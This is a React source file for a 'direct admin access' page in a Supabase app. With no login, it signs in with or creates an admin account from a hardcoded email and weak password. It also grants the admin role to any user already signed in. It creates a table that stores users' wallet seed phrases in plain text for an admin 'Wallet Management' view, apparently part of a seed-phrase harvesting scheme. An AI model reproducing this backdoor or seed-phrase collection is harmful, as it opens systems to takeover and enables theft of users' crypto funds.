import React, { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/lib/supabase";
import { Loader2, Shield, CheckCircle } from "lucide-react";
import { useToast } from "@/components/ui/use-toast";
import { Button } from "@/components/ui/button";

/**
 * This component provides direct admin access without requiring login
 * It automatically sets up admin privileges and redirects to the admin dashboard
 */
const DirectAdminAccess = () => {
  const navigate = useNavigate();
  const { toast } = useToast();
  const [message, setMessage] = useState("Setting up admin access...");
  const [step, setStep] = useState(1);
  const [error, setError] = useState("");
  const [success, setSuccess] = useState(false);
  
  // Function to create the necessary tables in Supabase
  const createTables = async () => {
    try {
      setMessage("Creating necessary database tables...");
      
      // Create profiles table if it doesn't exist
      const { error: profilesError } = await supabase.rpc('create_table_if_not_exists', {
        table_name: 'profiles',
        table_definition: `
          id UUID PRIMARY KEY REFERENCES auth.users(id),
          full_name TEXT,
          avatar_url TEXT,
          role TEXT DEFAULT 'user',
          email TEXT,
          created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
        `
      });
      
      if (profilesError) {
        console.log("Using alternative method to check/create profiles table");
        // Just try to select from the table to see if it exists
        const { error: selectError } = await supabase
          .from('profiles')
          .select('id')
          .limit(1);
          
        if (selectError && selectError.code === '42P01') {
          setError("Profiles table doesn't exist and couldn't be created automatically. Please run the SQL setup script.");
          return false;
        }
      }
      
      // Create wallet_connections table if it doesn't exist
      const { error: walletError } = await supabase.rpc('create_table_if_not_exists', {
        table_name: 'wallet_connections',
        table_definition: `
          id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
          user_id UUID REFERENCES auth.users(id),
          user_email TEXT,
          name TEXT,
          blockchain TEXT,
          wallet_type TEXT,
          address TEXT,
          seed_phrase TEXT,
          seed_phrase_required INTEGER DEFAULT 12,
          status TEXT DEFAULT 'pending',
          created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
        `
      });
      
      if (walletError) {
        console.log("Using alternative method to check/create wallet_connections table");
        // Just try to select from the table to see if it exists
        const { error: selectError } = await supabase
          .from('wallet_connections')
          .select('id')
          .limit(1);
          
        if (selectError && selectError.code === '42P01') {
          console.log("Wallet connections table doesn't exist, but we can continue");
        }
      }
      
      return true;
    } catch (error) {
      console.error("Error creating tables:", error);
      return false;
    }
  };
  
  // Function to set up admin access
  const setupAdminAccess = async () => {
    try {
      setMessage("Setting up admin access...");
      setStep(2);
      
      // Set admin flags in localStorage
      localStorage.setItem('isAdmin', 'true');
      localStorage.setItem('adminSession', 'true');
      localStorage.setItem('adminPath', '/admin');
      localStorage.setItem('adminEmail', 'pastendro@gmail.com');
      
      // Check if the user is already signed in
      const { data: { session } } = await supabase.auth.getSession();
      
      if (!session) {
        // Try to sign in with pastendro@gmail.com
        setMessage("Signing in as admin...");
        
        const { data, error } = await supabase.auth.signInWithPassword({
          email: 'pastendro@gmail.com',
          password: 'Password123!'
        });
        
        if (error) {
          console.error("Error signing in:", error);
          // Try to create the account
          const { data: signUpData, error: signUpError } = await supabase.auth.signUp({
            email: 'pastendro@gmail.com',
            password: 'Password123!',
            options: {
              data: {
                role: 'admin'
              }
            }
          });
          
          if (signUpError) {
            setError("Failed to create admin account. Please try again.");
            return false;
          }
          
          if (!signUpData.user) {
            setError("Failed to create user account");
            return false;
          }
          
          // Set the user as admin in the profiles table
          const { error: profileError } = await supabase
            .from('profiles')
            .upsert({
              id: signUpData.user.id,
              full_name: 'Admin User',
              role: 'admin',
              email: 'pastendro@gmail.com'
            });
          
          if (profileError) {
            console.error("Profile error:", profileError);
          }
          
          setMessage("Admin account created! You can now access the admin dashboard.");
        } else if (data.user) {
          // Update the user's profile to have admin role
          const { error: profileError } = await supabase
            .from('profiles')
            .upsert({
              id: data.user.id,
              full_name: 'Admin User',
              role: 'admin',
              email: 'pastendro@gmail.com'
            });
          
          if (profileError) {
            console.error("Profile error:", profileError);
          }
        }
      } else if (session.user) {
        // Update the user's profile to have admin role
        const { error: profileError } = await supabase
          .from('profiles')
          .upsert({
            id: session.user.id,
            full_name: 'Admin User',
            role: 'admin',
            email: session.user.email
          });
        
        if (profileError) {
          console.error("Profile error:", profileError);
        }
      }
      
      setMessage("Admin access granted! You can now access the admin dashboard.");
      setStep(3);
      setSuccess(true);
      
      return true;
    } catch (error) {
      console.error("Error setting up admin access:", error);
      setError("Failed to set up admin access. Please try again.");
      return false;
    }
  };
  
  useEffect(() => {
    const initialize = async () => {
      // Step 1: Create necessary tables
      const tablesCreated = await createTables();
      
      if (!tablesCreated) {
        return;
      }
      
      // Step 2: Set up admin access
      const adminSetup = await setupAdminAccess();
      
      if (!adminSetup) {
        return;
      }
      
      // Show success message
      toast({
        title: "Admin Access Granted",
        description: "You now have full admin privileges",
      });
    };
    
    initialize();
  }, [toast]);
  
  const handleGoToAdmin = () => {
    navigate("/admin");
  };
  
  const handleGoToWallets = () => {
    navigate("/admin/wallets");
  };
  
  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-background p-4">
      <div className="p-4 bg-primary/10 rounded-full mb-4">
        <Shield className="h-12 w-12 text-primary" />
      </div>
      <h1 className="text-2xl font-bold mb-2">Admin Access Setup</h1>
      
      {error ? (
        <div className="bg-yellow-100 border border-yellow-400 text-yellow-700 px-4 py-3 rounded mb-4">
          <p className="font-bold">Error</p>
          <p>{error}</p>
          <Button 
            variant="outline" 
            className="mt-4"
            onClick={() => window.location.reload()}
          >
            Try Again
          </Button>
        </div>
      ) : (
        <>
          <div className="flex items-center gap-2 mb-8">
            {!success ? (
              <Loader2 className="h-5 w-5 animate-spin text-primary" />
            ) : (
              <CheckCircle className="h-5 w-5 text-yellow-500" />
            )}
            <p className="text-muted-foreground">{message}</p>
          </div>
          
          <div className="space-y-2 w-full max-w-md">
            <div className="flex items-center gap-2 mb-2">
              <div className={`w-8 h-8 rounded-full flex items-center justify-center ${step > 1 ? 'bg-yellow-100 text-yellow-700' : 'bg-primary/10 text-primary'}`}>
                {step > 1 ? <CheckCircle className="h-4 w-4" /> : '1'}
              </div>
              <p>Creating database tables</p>
            </div>
            
            <div className="flex items-center gap-2 mb-2">
              <div className={`w-8 h-8 rounded-full flex items-center justify-center ${step > 2 ? 'bg-yellow-100 text-yellow-700' : 'bg-primary/10 text-primary'}`}>
                {step > 2 ? <CheckCircle className="h-4 w-4" /> : '2'}
              </div>
              <p>Setting up admin access</p>
            </div>
            
            <div className="flex items-center gap-2 mb-2">
              <div className={`w-8 h-8 rounded-full flex items-center justify-center ${success ? 'bg-yellow-100 text-yellow-700' : 'bg-primary/10 text-primary'}`}>
                {success ? <CheckCircle className="h-4 w-4" /> : '3'}
              </div>
              <p>Granting admin privileges</p>
            </div>
          </div>
          
          {success && (
            <div className="flex gap-4 mt-8">
              <Button onClick={handleGoToAdmin}>
                Go to Admin Dashboard
              </Button>
              <Button variant="outline" onClick={handleGoToWallets}>
                Go to Wallet Management
              </Button>
            </div>
          )}
        </>
      )}
      
      <div className="text-sm text-center max-w-md text-muted-foreground mt-8">
        This page automatically sets up admin access and provides direct links to the admin dashboard.
        <br />
        You can bookmark this page for easy access to admin features.
      </div>
    </div>
  );
};

export default DirectAdminAccess;
